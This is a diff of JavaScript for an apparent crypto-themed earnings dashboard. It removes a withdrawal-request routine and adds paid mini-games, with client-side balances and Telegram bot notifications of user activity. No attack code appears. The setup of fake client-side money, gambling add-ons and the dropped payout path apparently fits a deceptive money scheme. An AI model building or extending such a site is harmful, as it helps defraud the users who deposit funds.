+            document.getElementById('dashDeposit').innerText = `$${currentUserData.deposit.toFixed(2)}`;
+            document.getElementById('dashPending').innerText = `$${currentUserData.pending.toFixed(2)}`;
+            document.getElementById('dashAvailable').innerText = `$${currentUserData.available.toFixed(2)}`;
+            
+            const activeCount = currentUserData.activePlans ? currentUserData.activePlans.length : 0;
+            document.getElementById('dashActiveCount').innerText = `${activeCount} / 1 Active`;
 
-            if (!currentUserData.personalDetailsLocked || !(currentUserData.kycData && currentUserData.kycData.isLocked)) {
-                alert("Profile Security Incomplete!\n\nYou must complete and lock both Personal Details and KYC Identity Verification in your Profile before requesting payouts.");
+            renderTransactionsTable();
+        }
+
+        function renderTransactionsTable() {
+            const tbody = document.getElementById('txTableBody');
+            if (!currentUserData.transactions || currentUserData.transactions.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 24px;">No transaction history found.</td></tr>`;
                 return;
             }
 
-            const amount = parseFloat(document.getElementById('payoutAmt').value);
-            const method = document.getElementById('payoutMethodSelect').value;
-            const targetAddress = document.getElementById('payoutTargetAddress').value;
-
-            if (isNaN(amount) || amount <= 0) {
-                alert("Please enter a valid payout amount.");
-                return;
-            }
-
-            if (amount > 500) {
-                alert("Maximum withdrawal limit per request is $500.");
-                return;
-            }
-
-            if (amount > currentUserData.available) {
-                alert(`Insufficient Available Withdrawal Balance! Available: $${currentUserData.available.toFixed(2)}`);
-                return;
-            }
-
-            const todayStr = new Date().toDateString();
-            if (currentUserData.dailyWithdrawals.date !== todayStr) {
-                currentUserData.dailyWithdrawals = { date: todayStr, count: 0 };
-            }
-
-            if (currentUserData.dailyWithdrawals.count >= 3) {
-                alert("Daily Limit Reached! Maximum 3 withdrawals allowed per day.");
-                return;
-            }
-
-            const verifyCode = Math.floor(100000 + Math.random() * 900000).toString();
-
-            currentUserData.available -= amount;
-            currentUserData.dailyWithdrawals.count++;
-
-            addTx("Payout Request", `-$${amount.toFixed(2)}`, "Pending Approval");
-            saveSystemDB();
-            updateUI();
-
-            document.getElementById('displayVerificationCode').innerText = verifyCode;
-
-            sendTelegramNotification(`<b>💸 Withdrawal Requested!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Amount:</b> $${amount.toFixed(2)}\n<b>Method:</b> ${method}\n<b>Address:</b> ${targetAddress}\n<b>Code:</b> <code>${verifyCode}</code>`);
-
-            closeModal('payoutModal');
-            openModal('payoutSuccessModal');
+            tbody.innerHTML = currentUserData.transactions.map(tx => `
+                <tr>
+                    <td><strong>${tx.id}</strong></td>
+                    <td>${tx.type}</td>
+                    <td style="font-weight: 700; color: ${tx.amount.startsWith('+') ? 'var(--accent-green)' : 'var(--accent-red)'};">${tx.amount}</td>
+                    <td>${tx.date}</td>
+                    <td><span style="background: rgba(16, 185, 129, 0.15); color: var(--accent-green); padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 700;">${tx.status}</span></td>
+                </tr>
+            `).join('');
         }
 
         function handleSupportSubmit(e) {
@@ -1887,7 +1790,7 @@
             const email = document.getElementById('supEmail').value.trim();
             const msg = document.getElementById('supMsg').value.trim();
 
-            sendTelegramNotification(`<b>📩 Support Message Received</b>\n\n<b>User:</b> ${name}\n<b>Email:</b> ${email}\n<b>Message:</b> ${msg}`);
+            sendTelegramNotification(`<b>📩 New Support Desk Message!</b>\n\n<b>From Name:</b> ${name}\n<b>Username:</b> ${currentUserData ? currentUserData.profile.username : 'Guest'}\n<b>Email:</b> ${email}\n<b>Message:</b>\n${msg}`);
 
             document.getElementById('supportResponseBox').style.display = 'flex';
             document.getElementById('supName').value = '';
@@ -1895,46 +1798,142 @@
             document.getElementById('supMsg').value = '';
         }
 
-        function addTx(type, amount, status) {
-            const tx = {
-                id: 'TX' + Math.floor(100000 + Math.random() * 900000),
-                type: type,
-                amount: amount,
-                datetime: new Date().toLocaleString(),
-                status: status
-            };
-            currentUserData.transactions.unshift(tx);
+        /* --- ERAN MINE GAMES LOGIC --- */
+        let mineState = [null, null, null, null, null, null];
+        let mineBombIndex = null;
+        let selectedCoin = 'HEADS';
+
+        function checkGameBalance() {
+            if (currentUserData.available < 2.00) {
+                alert('Insufficient Available Balance to play game!\n\nGame Entry Fee: $2.00\nYour Available Balance:$' + currentUserData.available.toFixed(2));
+                return false;
+            }
+            return true;
         }
 
-        function updateUI() {
-            if (!currentUserData) return;
-
-            document.getElementById('dashDeposit').innerText = `$${currentUserData.deposit.toFixed(2)}`;
-            document.getElementById('dashPending').innerText = `$${currentUserData.pending.toFixed(2)}`;
-            document.getElementById('dashAvailable').innerText = `$${currentUserData.available.toFixed(2)}`;
-            
-            const activeCount = currentUserData.activePlans ? currentUserData.activePlans.length : 0;
-            document.getElementById('dashActiveCount').innerText = `${activeCount} / 1 Active`;
-
-            renderTxTable();
+        function deductGameFee(gameName) {
+            currentUserData.available -= 2.00;
+            addTx(`Game Entry Fee (${gameName})`, `-$2.00`, "Completed");
+            saveSystemDB();
+            updateUI();
         }
 
-        function renderTxTable() {
-            const tbody = document.getElementById('txTableBody');
-            if (!currentUserData.transactions || currentUserData.transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:var(--text-muted);">No transaction activity recorded.</td></tr>`;
-                return;
+        function resetMineGame() {
+            mineState = [null, null, null, null, null, null];
+            mineBombIndex = Math.floor(Math.random() * 6);
+            const btns = document.querySelectorAll('.mine-btn');
+            btns.forEach(btn => {
+                btn.innerText = '❓';
+                btn.style.background = 'rgba(255, 255, 255, 0.05)';
+            });
+        }
+
+        function playMineTile(index) {
+            if (mineState[index] !== null) return;
+            if (!mineState.some(x => x !== null)) {
+                if (!checkGameBalance()) return;
+                deductGameFee('Mine Sweeper');
             }
 
-            tbody.innerHTML = currentUserData.transactions.map(tx => `
-                <tr>
-                    <td><code>${tx.id}</code></td>
-                    <td>${tx.type}</td>
-                    <td style="font-weight:700; color:${tx.amount.startsWith('+') ? 'var(--accent-green)' : (tx.amount.startsWith('-') ? '#EF4444' : 'var(--accent-gold)')}">${tx.amount}</td>
-                    <td style="font-size:12px; color:var(--text-muted);">${tx.datetime}</td>
-                    <td><span style="padding:4px 10px; border-radius:10px; font-size:11px; font-weight:700; background:${tx.status === 'Completed' ? 'rgba(16, 185, 129, 0.2)' : 'rgba(245, 158, 11, 0.2)'}; color:${tx.status === 'Completed' ? 'var(--accent-green)' : 'var(--accent-gold)'}">${tx.status}</span></td>
-                </tr>
-            `).join('');
+            if (index === mineBombIndex) {
+                mineState[index] = 'BOMB';
+                document.querySelectorAll('.mine-btn')[index].innerText = '💣';
+                document.querySelectorAll('.mine-btn')[index].style.background = 'rgba(239, 68, 68, 0.3)';
+                alert('BOOM! You hit the mine bomb! Game Over.');
+                resetMineGame();
+            } else {
+                mineState[index] = 'GEM';
+                document.querySelectorAll('.mine-btn')[index].innerText = '💎';
+                document.querySelectorAll('.mine-btn')[index].style.background = 'rgba(16, 185, 129, 0.3)';
+                
+                const winReward = 4.00;
+                currentUserData.available += winReward;
+                addTx("Mine Sweeper Win Reward", `+$${winReward.toFixed(2)}`, "Completed");
+                saveSystemDB();
+                updateUI();
+                
+                sendTelegramNotification(`<b>💣 Mine Sweeper Win!</b>\n\nUser <b>@${currentUserData.profile.username}</b> uncovered a gem and won <b>+$${winReward.toFixed(2)}</b>!`);
+                alert(`JACKPOT GEM! You found a treasure gem and won +$${winReward.toFixed(2)} cash credited directly to your Available Balance!`);
+            }
+        }
+
+        function spinFortuneWheel() {
+            if (!checkGameBalance()) return;
+            deductGameFee('Fortune Wheel');
+
+            const wheelText = document.getElementById('wheelText');
+            wheelText.style.transform = 'rotate(1080deg)';
+
+            setTimeout(() => {
+                const rewards = [0.50, 1.00, 3.00, 5.00, 10.00, 20.00];
+                const winAmt = rewards[Math.floor(Math.random() * rewards.length)];
+                
+                wheelText.style.transform = 'rotate(0deg)';
+                wheelText.innerText = `$${winAmt.toFixed(2)}`;
+
+                currentUserData.available += winAmt;
+                addTx("Fortune Wheel Reward", `+$${winAmt.toFixed(2)}`, "Completed");
+                saveSystemDB();
+                updateUI();
+
+                sendTelegramNotification(`<b>🎡 Fortune Wheel Win!</b>\n\nUser <b>@${currentUserData.profile.username}</b> spun the wheel and won <b>+$${winAmt.toFixed(2)}</b>!`);
+                alert(`Wheel Stopped! Congratulations, you won +$${winAmt.toFixed(2)} credited to your Available Balance!`);
+            }, 1200);
+        }
+
+        function selectCoinSide(side) {
+            selectedCoin = side;
+            document.getElementById('btnHeads').style.border = side === 'HEADS' ? '2px solid var(--accent-gold)' : 'none';
+            document.getElementById('btnTails').style.border = side === 'TAILS' ? '2px solid var(--accent-gold)' : 'none';
+        }
+
+        function flipCryptoCoin() {
+            if (!checkGameBalance()) return;
+            deductGameFee('Crypto Flip');
+
+            const coin = document.getElementById('coinDisplay');
+            coin.style.transform = 'rotateY(720deg)';
+
+            setTimeout(() => {
+                coin.style.transform = 'rotateY(0deg)';
+                const result = Math.random() > 0.5 ? 'HEADS' : 'TAILS';
+                coin.innerText = result === 'HEADS' ? '₿' : '🪙';
+
+                if (result === selectedCoin) {
+                    const winAmt = 4.00;
+                    currentUserData.available += winAmt;
+                    addTx("Crypto Flip Double Win", `+$${winAmt.toFixed(2)}`, "Completed");
+                    saveSystemDB();
+                    updateUI();
+
+                    sendTelegramNotification(`<b>🪙 Crypto Flip Win!</b>\n\nUser <b>@${currentUserData.profile.username}</b> guessed correctly (${result}) and won <b>+$${winAmt.toFixed(2)}</b>!`);
+                    alert(`WINNER! Coin landed on ${result}. You doubled your cash and won +$${winAmt.toFixed(2)}!`);
+                } else {
+                    alert(`Landed on ${result}. Bad luck this time!`);
+                }
+            }, 800);
+        }
+
+        function openMysteryBox(boxNum) {
+            if (!checkGameBalance()) return;
+            deductGameFee('Mystery Box');
+
+            const boxRewards = [1.00, 5.00, 50.00];
+            const winAmt = boxRewards[Math.floor(Math.random() * boxRewards.length)];
+
+            document.getElementById('boxStatusText').innerText = `Box #${boxNum} opened! You found $${winAmt.toFixed(2)}!`;
+
+            currentUserData.available += winAmt;
+            addTx("Mystery Box Jackpot", `+$${winAmt.toFixed(2)}`, "Completed");
+            saveSystemDB();
+            updateUI();
+
+            sendTelegramNotification(`<b>🎁 Mystery Box Unboxed!</b>\n\nUser <b>@${currentUserData.profile.username}</b> opened Box #${boxNum} and won <b>+$${winAmt.toFixed(2)}</b>!`);
+            alert(`UNBOXED! You opened Box #${boxNum} and discovered +$${winAmt.toFixed(2)} cash prize!`);
+        }
+
+        function resetMysteryBoxes() {
+            document.getElementById('boxStatusText').innerText = 'Select a box to play ($2.00)';
         }
     </script>
 </body>
